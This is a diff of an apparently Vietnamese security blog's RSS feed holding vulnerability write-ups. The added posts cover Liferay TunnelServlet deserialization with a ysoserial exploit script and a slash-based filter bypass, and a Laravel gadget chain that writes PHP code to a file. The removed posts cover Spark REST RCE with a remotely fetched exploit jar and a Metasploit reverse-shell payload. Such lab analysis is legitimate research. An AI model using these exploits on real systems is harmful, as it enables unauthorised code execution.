@@ -153,7 +153,7 @@ file_put_contents($file, $contents);
 <p>Cấu trúc của mỗi đoạn đầu của log như sau:</p>
 <pre tabindex="0"><code>[Date][Error_data]&lt;viewFile&gt;[Error_data]&lt;viewFile&gt;[Error_data]
 </code></pre><p>Trong PHP có nhiều filter chuyển đổi cho nhiều kiểu mã hóa khác nhau. Tất cả đều có tiền tố <a href="https://www.php.net/manual/en/filters.convert.php#filters.convert.iconv" target="_blank" rel="noopener noreffer">convert.iconv.*</a>
- .  Vì cứ 2 byte thì sẽ được 1 char theo mã <code>UTF-16</code> nên khi convert từ <code>UTF16</code> sang <code>UTF-8</code> thì <code>H\0</code> -&gt; <code>H</code>. Do đó ta có thể xóa file log bằng cách truyền vào phía sau mỗi ký tự của payload một NULL byte (<code>\0</code>) sau đó chuyển đổi bảng mã từ  <code>UTF-16</code> sang <code>UTF-8</code>. Còn các cặp 2 byte ở <code>[Error_data]</code> sẽ bị convert thành junk chars giống như dưới đây. Sau đó phần junk chars này sẽ bị loại bỏ ở bước base64 decoding như đã nói ở phía trên:</p>
+ . Vì cứ 2 byte thì sẽ được 1 char theo mã <code>UTF-16</code> nên khi convert từ <code>UTF16</code> sang <code>UTF-8</code> thì <code>H\0</code> -&gt; <code>H</code>. Do đó ta có thể xóa file log bằng cách truyền vào phía sau mỗi ký tự của payload một NULL byte (<code>\0</code>) sau đó chuyển đổi bảng mã từ  <code>UTF-16</code> sang <code>UTF-8</code>. Còn các cặp 2 byte ở <code>[Error_data]</code> sẽ bị convert thành junk chars giống như dưới đây. Sau đó phần junk chars này sẽ bị loại bỏ ở bước base64 decoding như đã nói ở phía trên:</p>
 <table>
 <thead>
 <tr>
@@ -387,6 +387,128 @@ if __name__ == &#39;__main__&#39;:
 <p><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener noreffer">https://www.ambionics.io/blog/laravel-debug-rce</a>
 </p>
 <p><a href="https://knqyf263.hatenablog.com/entry/2021/10/09/165405" target="_blank" rel="noopener noreffer">https://knqyf263.hatenablog.com/entry/2021/10/09/165405</a>
+</p>
+]]></description>
+</item>
+<item>
+    <title>Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)</title>
+    <link>https://g03m0n.github.io/posts/liferay-tunnelservlet-deserialization-remote-code/liferay-tunnelservlet-deserialization-remote-code/</link>
+    <pubDate>Wed, 01 May 2024 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/liferay-tunnelservlet-deserialization-remote-code/liferay-tunnelservlet-deserialization-remote-code/</guid>
+    <description><![CDATA[<h1 id="liferay-tunnelservlet-deserialization-remote-code-execution-lpe-15538">Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)</h1>
+<ol>
+<li>
+<p>Mô tả và ảnh hưởng</p>
+<p>Liferay TunnelServlet bị lỗ hổng insecure deserialization do cấu hình sai, có thể bị truy cập bởi attacker (theo mặc định, nó chỉ bị giới hạn truy cập từ localhost). Tùy thuộc vào phiên bản của Liferay Portal, attacker có thể khai thác lỗ hổng này bằng cách sử dụng dữ liệu đã được serialized để thực thi mã tùy ý trên hệ thống.</p>
+<p>Các phiên bản ảnh hưởng:</p>
+<ul>
+<li>Liferay Portal CE 7.0 GA3, 7.0.1 GA2, 7.0.2 GA3</li>
+<li>Liferay Portal EE 6.0, 6.0 SP1, 6.0 SP2, 6.1 GA1, 6.1 GA2, 6.1 GA3, 6.2</li>
+<li>Liferay Digital Enterprise 7.0</li>
+</ul>
+</li>
+<li>
+<p>Chuẩn bị môi trường</p>
+<p>Cài đặt phiên bản ảnh hưởng: <a href="https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.1.0%20GA1/liferay-portal-tomcat-6.1.0-ce-ga1-20120106155615760.zip/download" target="_blank" rel="noopener noreffer"><strong>https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.1.0%20GA1/liferay-portal-tomcat-6.1.0-ce-ga1-20120106155615760.zip/download</strong></a>
+</p>
+<p>Giải nén và chạy file <code>..\liferay-portal-6.1.0-ce-ga1\tomcat-7.0.23\bin\startup.bat</code> để khởi chạy server.</p>
+<p></p>
+</li>
+<li>
+<p>Demo khai thác</p>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>, <span style="color:#a6e22e">os</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.84:8080&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;java \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-jar ./ysoserial-all.jar CommonsCollections3 calc.exe &gt; payload.bin &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">requests</span>.<span style="color:#a6e22e">post</span>(<span style="color:#a6e22e">url</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/api/////liferay&#34;</span>, <span style="color:#a6e22e">data</span><span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;payload.bin&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>))
+</span></span></code></pre></div><p></p>
+</li>
+<li>
+<p>Phân tích lỗ hổng</p>
+</li>
+</ol>
+<p>Tại file <code>..\tomcat-7.0.23\webapps\ROOT\WEB-INF\web.xml</code>, ta biết được các request đến <code>/api/liferay/*</code> sẽ được class Tunnel Servlet xử lí.</p>
+<p></p>
+<p></p>
+<p>Đi vào class Tunnel Servlet.</p>
+<p>Tại đây, phương thức <code>doPost</code> dùng để xử lý POST request, TunnelServlet nhận <code>ObjectInputStream</code> từ Post data (dòng 40) và sử dụng hàm <code>readObject()</code> (dòng 52) không đúng cách → Insecure deserialization.</p>
+<p></p>
+<p>Tuy nhiên, các đường dẫn <code>/api/liferay/*</code> mặc định chỉ được truy cập bởi localhost, mọi request từ bên ngoài đều bị filter. Cụ thể, khi truy cập <code>/api/liferay/*</code> thì Tunnel Servlet Filter được sử dụng.</p>
+<p></p>
+<p>Nó được định nghĩa tại class <code>com.liferay.portal.servlet.filters.secure.SecureFilter</code></p>
+<p></p>
+<p>Tại class <code>SecureFilter</code>, hàm <code>processFilter</code> được gọi để thực hiện các quy trình filter. Trong đó có chức năng kiểm tra xem Remote Address có nằm trong whitelist các Allowed host được access hay không bằng hàm <code>isAccessAllowed()</code>. Nếu không thì sẽ bị trả 403 Access denied. Đặt breakpoint như hình và debug.</p>
+<p></p>
+<p>Đặt Breakepoint tại dòng 86 và gửi gón tin POST tới</p>
+<p></p>
+<p>Hit breakpoint</p>
+<p></p>
+<p>F7 để đi vào hàm <code>isAccessAllowed()</code>.</p>
+<p></p>
+<p>Tại đây, ứng dụng sẽ kiểm tra xem <code>remoteAddr</code> (192.168.1.84) có nằm trong mảng whitelist ({SERVER_IP, 127.0.0.1}) <code>hostAllowed</code> hay không → nó không thuộc whitelist → Access denied.</p>
+<p>Tuy nhiên, để bypass filter này ta chỉ cần thêm n dấu <code>/</code> vào path <code>/api/liferay</code> → <code>/api/////liferay</code></p>
+<p></p>
+<p>Khi truy cập endpoint <code>/api/liferay</code>, đầu tiên request sẽ được filter thông qua hàm <code>doFilter()</code> của InvokerFilter class. Sau đó các <code>InvokerFilterChain</code> về urlPattern: <code>/api/liferay/*</code> được lấy để thực hiện filter request. Có thể thấy với /api/liferay thì có đi qua <code>SecureFilter</code>.</p>
+<p></p>
+<p>Còn <code>/api////////liferay</code> thì không:</p>
+<p></p>
+<p>Nguyên nhân nằm ở nơi lấy <code>InvokerFilterChain</code></p>
+<p></p>
+<p>Tại đây phương thức <code>getInvokerFilter()</code>  được gọi để thiết lập filterChain cho url, với các tham số truyền vào là <code>request</code> hiện tại, <code>uri</code> (/api/////liferay) và <code>filterchain</code></p>
+<p>Đi vào phương thức <code>getInvokerFilterChain()</code></p>
+<p></p>
+<p>Phương thức sẽ lấy <code>filterChain</code> từ 1 list có trước (<code>_filterChains</code>), với key chính là hashcode của uri truyền vào.
+Trong trường hợp truyền vào <code>/api////////liferay</code> thì sẽ tạo ra 1 hashcode khác, không tồn tại trong <code>_filterChains</code>, khi đó <code>invokerFilterChain == null</code> và sẽ nhảy tiếp vào phương thức
+<code>_invokerFilterHelper.createInvokerFilterChain()</code> để tạo ra 1 object <code>filterChain</code> mới.</p>
+<p>Đi vào phương thức <code>createInvokerFilterChain()</code></p>
+<p></p>
+<p>Phương thức sẽ check match của uri truyền vào với các filterMap đã có sẵn.</p>
+<p>Chức năng của phương thức <code>isMatch()</code>là check xem uri truyền vào có giống với pattern của rule không, nếu có thì sẽ trả về true và add filter này vào list.</p>
+<p></p>
+<p>Bởi vì giá trị trả về của <code>isMatchURLPattern</code> là false nên filter này sẽ không được add vào <code>invokerFilterChain</code></p>
+<p></p>
+<p>Có thể nhìn thấy được <code>uri</code> truyền vào và <code>urlpattern</code> không match do <code>matchURLPattern</code> trả về false</p>
+<p></p>
+<p>→ <code>SecureFilter</code> không được add vào với request là <code>/api/////////liferay</code></p>
+<p>→ <code>SecureFilter</code> không được invoke nên bị bypass</p>
+<ol start="5">
+<li>Sửa lỗi của NPH.</li>
+</ol>
+<p>Liferay đã thêm một hàm <code>ProtectedClassLoaderObjectInputStream()</code> để filter những authenticated access, và userInputStream.</p>
+<p></p>
+<p>Tại các phiên bản sau, sau khi lấy URI bằng hàm <code>getURI()</code> tại class InvokerFilter Liferay đã thực hiện normalize lại nó bằng hàm <code>HttpComponentsUtil.normalizePath()</code></p>
+<p></p>
+<p></p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 ]]></description>
 </item>
@@ -1097,147 +1219,204 @@ Các lệnh của được xử lý thông qua tham số <code>?doAs</code> và 
 ]]></description>
 </item>
 <item>
-    <title>CVE-2020-9480</title>
-    <link>https://g03m0n.github.io/posts/cve-2020-9840/cve-2020-9840/</link>
-    <pubDate>Tue, 21 Nov 2023 08:29:01 &#43;0800</pubDate>
+    <title>CVE-2024-40075</title>
+    <link>https://g03m0n.github.io/posts/cve-2024-40075/cve-2024-40075-php-insecure-deserialization-at-lar-9febb78dc26644d288182458176f17ce/</link>
+    <pubDate>Wed, 22 Nov 2023 08:29:01 &#43;0800</pubDate>
     <author>g03m0n</author>
-    <guid>https://g03m0n.github.io/posts/cve-2020-9840/cve-2020-9840/</guid>
-    <description><![CDATA[<h3 id="description">Description</h3>
-<p>Lỗ hổng phát sinh khi tính năng xác thực chính (<code>spark.authenticate</code>) được bật bằng cách sử dụng shared secret. Thông thường, tính năng này yêu cầu người dùng cung cấp <code>shared secret</code> để khởi động tài nguyên của ứng dụng trên Spark <code>cluster</code>. Tuy nhiên, lệnh gọi thủ tục từ xa (RPC) có thể bỏ qua quá trình xác thực và bắt đầu thực thi lệnh thành công, ngay cả khi không có <code>shared secret</code>.
-Kẻ tấn công có thể khai thác lỗ hổng bảo mật này để thực thi từ xa các lệnh shell tùy ý trên máy chủ nơi Spark <code>cluster</code> đang chạy. Bằng cách tận dụng lỗ hổng bảo mật, kẻ tấn công có thể truy cập và kiểm soát trái phép toàn bộ <code>cluster</code>, có khả năng dẫn đến đánh cắp dữ liệu, xâm phạm hệ thống hoặc khai thác mạng thêm.
-Lỗ hổng xảy ra ở chế độ <code>standalone</code> khi xác thực quyền bị bỏ qua, dẫn đến RCE.</p>
-<h3 id="goal">Goal</h3>
-<p>Khai thác lỗ hổng CVE-2020-9840 thông qua REST API dẫn đến thực thi dòng lệnh từ xa.</p>
-<h3 id="exploitation">Exploitation</h3>
-<p><strong>Bước 1:</strong> Khởi chạy máy ảo Docker bằng câu lệnh <code>docker-compose up</code>:</p>
-<p></p>
-<p>Đây là giao diện chính của Spark Worker:</p>
-<p></p>
-<p><strong>Bước 2:</strong> Tạo một file exploit viết bằng java và lưu với tên <code>Exploit.java</code></p>
-<pre tabindex="0"><code>import java.io.BufferedReader;
-import java.io.InputStreamReader;
-
-public class Exploit {
-  public static void main(String[] args) throws Exception {
-    String[] cmds = args[0].split(&#34;,&#34;);
-
-    for (String cmd : cmds) {
-      System.out.println(cmd);
-      System.out.println(executeCommand(cmd.trim()));
-      System.out.println(&#34;==============================================&#34;);
-    }
-  }
-  private static String executeCommand(String command) {
-    StringBuilder output = new StringBuilder();
-
-    try {
-      Process p = Runtime.getRuntime().exec(command);
-      p.waitFor();
-      BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));       
-
-      String line;
-      while ((line = reader.readLine()) != null) {
-        output.append(line).append(&#34;\n&#34;);
-      }
-    } catch (Exception e) {
-      e.printStackTrace();
-    }
-
-    return output.toString();
-  }
-}
-</code></pre><p><strong>Bước 3:</strong> Convert tệp <code>Exploit.java</code> thành <code>Exploit.jar</code> bằng 2 câu lệnh:</p>
-<pre tabindex="0"><code>javac .\Exploit.jar
-jar -cvf Exploit.jar Exploit.java
-</code></pre><p></p>
-<p><strong>Bước 4:</strong> Khởi tạo máy chủ local để đẩy file <code>Exploit.jar</code> lên server với câu lệnh <code>python -m http.server</code></p>
-<p></p>
-<p><strong>Bước 5:</strong> Ở chế độ <code>standalone</code>, máy chủ sẽ khởi động máy chủ HTTP trên cổng 6066 và chúng ta sẽ gửi API REST tới cổng này:</p>
-<pre tabindex="0"><code>POST /v1/submissions/create HTTP/1.1
-Host: 192.168.1.39:6066
-Accept-Encoding: gzip, deflate
-Accept: */*
-Accept-Language: en
-User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
-Content-Type: application/json
-Connection: close
-Content-Length: 680
-
-{
-  &#34;action&#34;: &#34;CreateSubmissionRequest&#34;,
-  &#34;clientSparkVersion&#34;: &#34;2.3.1&#34;,
-  &#34;appArgs&#34;: [
-    &#34;whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf&#34;
-  ],
-  &#34;appResource&#34;: &#34;http://192.168.1.39:8000/Exploit.jar&#34;,
-  &#34;environmentVariables&#34;: {
-    &#34;SPARK_ENV_LOADED&#34;: &#34;1&#34;
-  },
-  &#34;mainClass&#34;: &#34;Exploit&#34;,
-  &#34;sparkProperties&#34;: {
-    &#34;spark.jars&#34;: &#34;http://192.168.1.39:8000/Exploit.jar &#34;,
-    &#34;spark.driver.supervise&#34;: &#34;false&#34;,
-    &#34;spark.app.name&#34;: &#34;Exploit&#34;,
-    &#34;spark.eventLog.enabled&#34;: &#34;true&#34;,
-    &#34;spark.submit.deployMode&#34;: &#34;cluster&#34;,
-    &#34;spark.master&#34;: &#34;spark://192.168.1.39:6066&#34;
-  }
-}
-</code></pre><p>Trong đó, <code>spark.jars</code> là ứng dụng được biên dịch, <code>mainClass</code> là lớp sẽ được chạy và <code>appArgs</code> là các tham số được truyền cho ứng dụng.</p>
-<p></p>
-<p>Bước 5: Có <code>submitId</code> trong gói tin <code>Reponses</code>, ta vào đường dẫn sau để xem kết quả được thực thi:</p>
-<p><code>http://192.168.1.39:8081/logPage/?driverId={submissionId}&amp;logType=stdout</code></p>
-<p></p>
-<p><strong>Video demo</strong></p>
-
-<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/ahpHgVADNf0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
-
-]]></description>
-</item>
-<item>
-    <title>CVE-2018-11770</title>
-    <link>https://g03m0n.github.io/posts/cve-2018-11770/cve-2018-11770/</link>
-    <pubDate>Mon, 20 Nov 2023 08:29:01 &#43;0800</pubDate>
-    <author>g03m0n</author>
-    <guid>https://g03m0n.github.io/posts/cve-2018-11770/cve-2018-11770/</guid>
-    <description><![CDATA[<h3 id="description">Description</h3>
-<p>CVE-2018-11770 được phát hiện bởi nhà nghiên cứu Trung Quốc Fengwei Zhang (Alibaba Cloud Security Team), API REST <code>CreateSubmissionRequest</code> có thể bị khai thác khi ở chế độ <code>standalone</code> cho phép hacker gửi mã độc và thực thi mã từ xa.
-Nguyên nhân xảy ra
-Từ phiên bản 1.3.0 trở đi, <code>Spark's standalone</code> master cung cấp một REST API để gửi công việc từ xa, bên cạnh việc sử dụng spark-submit. Trong chế độ <code>standalone</code>, thuộc tính cấu hình <code>spark.authenticate.secret</code> thiết lập một khóa bí mật chung để xác thực các yêu cầu gửi công việc thông qua <code>spark-submit</code>. Tuy nhiên, REST API không sử dụng cơ chế xác thực này hoặc bất kỳ cơ chế xác thực nào khác. Trong trường hợp này, bất kỳ người dùng nào cũng sẽ có thể chạy một chương trình trình điều khiển (có thể được viết bằng java, python,…) mà không cần xác thực.</p>
-<h3 id="goal">Goal</h3>
-<p>Khai thác lỗ hổng <code>CVE-2018-11770</code> sử dụng framework <code>metasploit</code>, sau đó tiến hành RCE.</p>
-<h3 id="exploitation">Exploitation</h3>
-<p><strong>Bước 1:</strong> Khởi chạy máy ảo Docker bằng câu lệnh
-<code>docker-compose up</code></p>
-<p></p>
-<p><strong>Bước 2:</strong> Tiến hành khai thác bằng <code>metasploit</code> framework</p>
-<p></p>
-<p><strong>Bước 3:</strong> Sử dụng module <code>spark_unauth_rce</code> bằng câu lệnh <code>use exploit/linux/http/spark_unauth_rce</code>.</p>
-<p></p>
-<p><strong>Bước 4:</strong> Sử dụng câu lệnh <code>show options</code> để xem các cấu hình:</p>
-<p></p>
-<p><strong>Bước 5:</strong> Tại đây chúng ta sẽ thiết lập IP cho <code>RHOST</code>, <code>LHOST</code> và tìm những payload phù hợp để tấn công vào máy mục tiêu:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">RHOSTS</span> <span style="color:#ae81ff">192.168</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1.39</span> 
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">RPORT</span> <span style="color:#ae81ff">6066</span> 
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">LHOST</span> <span style="color:#ae81ff">192.168</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1.39</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">LPORT</span> <span style="color:#ae81ff">5555</span>	
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">payload</span> <span style="color:#a6e22e">java</span><span style="color:#f92672">/</span><span style="color:#a6e22e">meterpreter</span><span style="color:#f92672">/</span><span style="color:#a6e22e">reverse_tcp</span>                                                       
+    <guid>https://g03m0n.github.io/posts/cve-2024-40075/cve-2024-40075-php-insecure-deserialization-at-lar-9febb78dc26644d288182458176f17ce/</guid>
+    <description><![CDATA[<h1 id="cve-2024-40075-php-insecure-deserialization-at-laravel-v11x">CVE-2024-40075 PHP Insecure Deserialization at Laravel v11.x</h1>
+<ol>
+<li>
+<p><strong>Description and Impact</strong>
+Laravel là một framework ứng dụng web mã nguồn mở được viết bằng PHP. Do phương thức <code>__destruct</code> của lớp <code>Monolog\Handler\Handler</code> gọi phương thức <code>close</code>, <code>GroupHandler</code> đã ghi đè phương thức này và gọi phương thức <code>close</code> của mỗi handler. Khi deserialize các đối tượng độc hại, phương thức <code>getStreamName</code> sẽ gọi phương thức <code>__toString</code> của đối tượng đó. Kẻ tấn công có thể lợi dụng những phương thức có sẵn tồn tại trong ứng dụng để tạo ra chuỗi khai thác dựa trên Laravel và thực thi mã tùy ý.</p>
+<p>Version affected: <strong>v11.x</strong></p>
+</li>
+<li>
+<p><strong>Root cause analysis</strong></p>
+<p>Gadget chain:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">Monolog\Handler\Handler</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">__destruct</span>()
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Monolog\Handler\GroupHandler</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">close</span>()
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Psy\Readline\Hoa\Stream</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">close</span>() <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">md5</span>()
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Termwind\Components\Element</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">__toString</span>()
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Termwind\Components\Element</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">toString</span>()
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Termwind\ValueObjects\Styles</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">format</span>()
 </span></span></code></pre></div><p></p>
-<p><strong>Bước 6:</strong> Các thiết lập cho việc khai thác máy mục tiêu bằng <code>metasploit</code> đã hoàn thành thực hiện câu lệnh <code>exploit</code> để khai thác.</p>
+<p><code>Monolog/Handler/Handler.php</code></p>
 <p></p>
-<p><strong>Bước 7:</strong> Khai thác thành công</p>
+<p>Gadget đầu tiên chính là phương thức <code>__destruct()</code> của lớp <code>Monolog\Handler\Handler</code>. Vì đây là một Abtract class nên ta cần phải tìm lớp kế thừa của nó để khởi tạo Object → khởi tạo class <code>GroupHandler</code>.</p>
 <p></p>
-<p><strong>Bước 8:</strong> <code>Submit-job</code> thành công:</p>
+<p>Khi Object <code>GroupHandler</code> bị hủy, nó sẽ gọi đến magic method <code>__destruct()</code> của lớp cha, trong <code>__destruct()</code> lại gọi đến <code>$this-&gt;close()</code>. Vì đã khởi tạo lớp <code>GroupHandler</code>, nên sẽ gọi đến phương thức <code>close()</code> của lớp <code>GroupHandler</code>.</p>
+<p><code>Monolog/Handler/GroupHandler.php</code></p>
+<p></p>
+<p>Tại đây, vì <code>$this-&gt;handlers</code> có thể kiểm soát được, nên có thể truyền vào payload để khi ứng dụng gọi đến <code>$handler-&gt;close()</code> sẽ trigger được đến phương thức <code>close()</code> của class <code>Readline\Hoa\Stream</code></p>
+<p>Vì <code>Stream</code> là Abstract class, nên cần một class khác thực hiện, ở đây sử dụng <code>FileRead</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">handlers</span> <span style="color:#f92672">=</span> $oa; <span style="color:#75715e">// Với $oa = Psy\Readline\Hoa\FileRead
+</span></span></span></code></pre></div><p></p>
+<p><code>ReadLine/Hoa/Stream.php</code></p>
+<p></p>
+<p>Tiếp theo, ứng dụng gọi đến <code>$this-&gt;getStreamName()</code> sau đó gán vào biến <code>$streamName</code>, khi thực thi <code>md5()</code> bên dưới, nếu giá trị của <code>$streamName</code> là một đối tượng, nó sẽ gọi đến magic method <code>__toString()</code> của đối tượng đó.</p>
+<p>Đi vào <code>getStreamName()</code>:</p>
+<p></p>
+<p>Vì <code>Termwind\Components\Element</code> là một Abstract class, nên để gọi đến <code>Element</code> ta cần gọi đến lớp <code>Hr</code> là lớp kế thừa của nó. Ở đây ta cần khởi tạo <code>$this-&gt;_bucket = Termwind\Components\Hr</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_bucket</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> $oa <span style="color:#75715e">// Với $oa = Termwind\Components\Hr
+</span></span></span></code></pre></div><p></p>
+<p>Trigger được đến <code>__tostring()</code> của class <code>Element</code>:</p>
+<p></p>
+<p>Sau đó ứng dụng tiếp tục gọi đến <code>toString()</code>:</p>
+<p></p>
+<p>Trong phương thức này cần gán <code>$this-&gt;styles = Termwind\ValueObjects\Styles</code> để gọi đến phương thức <code>format()</code> của đối tượng này với tham số là <code>$this-&gt;content</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">styles</span> <span style="color:#f92672">=</span> $oa <span style="color:#75715e">// Với $oa = Termwind\ValueObjects\Styles
+</span></span></span></code></pre></div><p></p>
+<p>F7 đi vào phương thức <code>format()</code> của class <code>Styles</code>:</p>
+<p></p>
+<p>Trong vòng lặp <code>foreach</code> giá trị của <code>$modifier</code> có thể kiểm soát được, vì vậy có thể gọi <code>file_put_contents</code> để ghi nội dung vào file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">textModifiers</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;file_put_contents&#34;</span>]; 
+</span></span><span style="display:flex;"><span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">properties</span> <span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span>		[
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;styles&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34; *&lt;?php*  phpinfo **();** *?&gt;* &#34;</span>, 
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;parentStyles&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>		];
+</span></span></code></pre></div><p><strong>Stack trace</strong>:</p>
+<p></p>
+</li>
+<li>
+<p><strong>Steps to reproduce</strong></p>
+<p>Set up environment</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">composer</span> <span style="color:#a6e22e">create</span><span style="color:#f92672">-</span><span style="color:#a6e22e">project</span> <span style="color:#a6e22e">laravel</span><span style="color:#f92672">/</span><span style="color:#a6e22e">laravel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;11.1.1&#34;</span> <span style="color:#a6e22e">App</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">artisan</span> <span style="color:#a6e22e">make</span><span style="color:#f92672">:</span><span style="color:#a6e22e">controller</span> <span style="color:#a6e22e">UnserializeController</span>
+</span></span></code></pre></div><p><code>app/http/Controllers/UnserializeController.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">App\Http\Controllers</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> <span style="color:#a6e22e">Illuminate\Http\Request</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">UnserializeController</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">Controller</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">unserializeData</span>(<span style="color:#a6e22e">Request</span> $request)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $serializedData <span style="color:#f92672">=</span> $request<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">serialized_data</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//        dd($serializedData);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Unserialize dữ liệu
